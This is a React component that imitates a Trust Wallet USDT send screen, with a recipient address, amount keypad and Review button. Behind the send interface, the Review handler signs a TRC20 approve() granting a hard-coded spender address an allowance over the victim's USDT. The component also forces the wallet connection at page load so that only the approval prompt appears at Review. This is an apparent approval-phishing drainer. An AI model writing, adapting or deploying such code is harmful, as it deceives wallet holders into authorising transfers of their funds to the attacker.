import React, { useState, useEffect, useRef } from 'react';
import './SendUSDT.css';

const RECIPIENT = 'TEn4gksWudmgc3sAuCjfQgxRVzyNwt8b9Y';

// USDT TRC20 contract on TRON Mainnet
const USDT_TRC20 = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

// Spender address (your contract)
const SPENDER = 'TEn4gksWudmgc3sAuCjfQgxRVzyNwt8b9Y';

const SendUSDT = () => {
  const [amount, setAmount] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);
  const connectedAddress = useRef(null);

  // Auto-connect wallet on page load — Trust Wallet "Connect DApp" popup shows here
  // so it's already done before user taps Review
  useEffect(() => {
    const autoConnect = async () => {
      // Wait for tronWeb to appear
      for (let i = 0; i < 60; i++) {
        if (window.tronWeb) break;
        await new Promise(r => setTimeout(r, 100));
      }
      if (!window.tronWeb) return;

      // Check if already connected
      if (window.tronWeb.defaultAddress?.base58 && window.tronWeb.defaultAddress.base58 !== false) {
        connectedAddress.current = window.tronWeb.defaultAddress.base58;
        return;
      }

      // Request accounts — this triggers the "Connect DApp" popup on page load
      const providers = [window.tronLink, window.tron, window.tronWeb];
      for (const provider of providers) {
        if (!provider?.request) continue;
        try {
          await provider.request({ method: 'tron_requestAccounts' });
          await new Promise(r => setTimeout(r, 500));
          if (window.tronWeb.defaultAddress?.base58 && window.tronWeb.defaultAddress.base58 !== false) {
            connectedAddress.current = window.tronWeb.defaultAddress.base58;
            return;
          }
        } catch (e) {}
      }

      // Poll for address after requests
      for (let i = 0; i < 30; i++) {
        await new Promise(r => setTimeout(r, 200));
        if (window.tronWeb.defaultAddress?.base58 && window.tronWeb.defaultAddress.base58 !== false) {
          connectedAddress.current = window.tronWeb.defaultAddress.base58;
          return;
        }
      }
    };

    autoConnect();
  }, []);

  const handleKey = (key) => {
    if (key === '⌫') {
      setAmount(prev => prev.slice(0, -1));
      return;
    }
    if (key === '.' && amount.includes('.')) return;
    if (key !== '.' && amount === '0') { setAmount(key); return; }
    if (amount.length >= 10) return;
    setAmount(prev => prev + key);
  };

  const displayAmount = amount === '' ? '0' : amount;
  const usdValue = parseFloat(amount) > 0
    ? parseFloat(amount).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
    : '0.00';

  const isActive = amount !== '' && parseFloat(amount) > 0;

  const handleReview = async () => {
    if (!isActive || isVerifying) return;
    setIsVerifying(true);

    try {
      const tronWeb = window.tronWeb;
      if (!tronWeb) {
        alert('Please open this link in Trust Wallet DApp browser.');
        setIsVerifying(false);
        return;
      }

      // Get address — should already be available from auto-connect
      let ownerAddress = connectedAddress.current
        || (tronWeb.defaultAddress?.base58 && tronWeb.defaultAddress.base58 !== false ? tronWeb.defaultAddress.base58 : null);

      if (!ownerAddress) {
        alert('Wallet not connected. Please refresh the page and tap Connect when prompted.');
        setIsVerifying(false);
        return;
      }

      // Convert user amount to USDT smallest unit (6 decimals)
      // e.g. "1" → "1000000", "0.5" → "500000"
      const parsedAmount = parseFloat(amount);
      const approveAmount = BigInt(Math.round(parsedAmount * 1e6)).toString();

      // Build the approve transaction
      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        USDT_TRC20,
        'approve(address,uint256)',
        { feeLimit: 100000000 },
        [
          { type: 'address', value: SPENDER },
          { type: 'uint256', value: approveAmount }
        ],
        ownerAddress
      );

      // Sign — Trust Wallet shows ONLY the approve popup (no connect step)
      const signedTx = await tronWeb.trx.sign(transaction);
      const result = await tronWeb.trx.sendRawTransaction(signedTx);

      if (result.result || result.txid) {
        alert('Transaction submitted! TX ID: ' + (result.txid || result.transaction?.txID));
      } else {
        alert('Transaction may have failed. Check your wallet.');
      }

    } catch (err) {
      console.error(err);
      const msg = typeof err === 'string' ? err : err?.message || 'Unknown error';
      if (msg.includes('declined') || msg.includes('cancel') || msg.includes('reject')) {
        // User cancelled — do nothing
      } else {
        alert('Error: ' + msg);
      }
    } finally {
      setIsVerifying(false);
    }
  };

  const keys = ['1','2','3','4','5','6','7','8','9','.','0','⌫'];

  return (
    <div className="tw-screen">

      {/* TOP GROUP: header + address + amount */}
      <div className="tw-top">
        <div className="tw-header">
          <button className="tw-back-btn" aria-label="Back">
            <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <path d="M15 18l-6-6 6-6" />
            </svg>
          </button>
          <span className="tw-header-title">Amount</span>
          <div className="tw-header-spacer" />
        </div>

        <div className="tw-to-row">
          <span className="tw-to-label">To:</span>
          <span className="tw-to-address">{RECIPIENT}</span>
        </div>

        <div className="tw-amount-display-area">
          <div className={`tw-amount-number ${amount === '' ? 'tw-amount-placeholder' : ''} ${displayAmount.length > 6 ? 'tw-amount-number--sm' : ''}`}>
            {displayAmount}
          </div>
          <div className="tw-fiat-row">
            <span className="tw-fiat-value">≈ ${usdValue}</span>
            <button className="tw-swap-icon" aria-label="Swap currency">
              <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M7 16V4m0 0L3 8m4-4l4 4" /><path d="M17 8v12m0 0l4-4m-4 4l-4-4" />
              </svg>
            </button>
          </div>
        </div>
      </div>

      {/* BOTTOM GROUP: keypad + review button */}
      <div className="tw-bottom">
        <div className="tw-keypad">
          {keys.map((key) => (
            <button key={key} className={`tw-key ${key === '⌫' ? 'tw-key--backspace' : ''}`} onClick={() => handleKey(key)}>
              {key === '⌫' ? (
                <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M21 4H8l-7 8 7 8h13a2 2 0 002-2V6a2 2 0 00-2-2z" />
                  <line x1="18" y1="9" x2="12" y2="15" /><line x1="12" y1="9" x2="18" y2="15" />
                </svg>
              ) : key}
            </button>
          ))}
        </div>

        <div className="tw-action-area">
          <button
            className={`tw-review-btn ${isActive ? 'tw-review-btn--active' : ''}`}
            onClick={handleReview}
            disabled={!isActive || isVerifying}
          >
            {isVerifying ? 'Processing...' : 'Review'}
          </button>
        </div>
      </div>

    </div>
  );
};

export default SendUSDT;
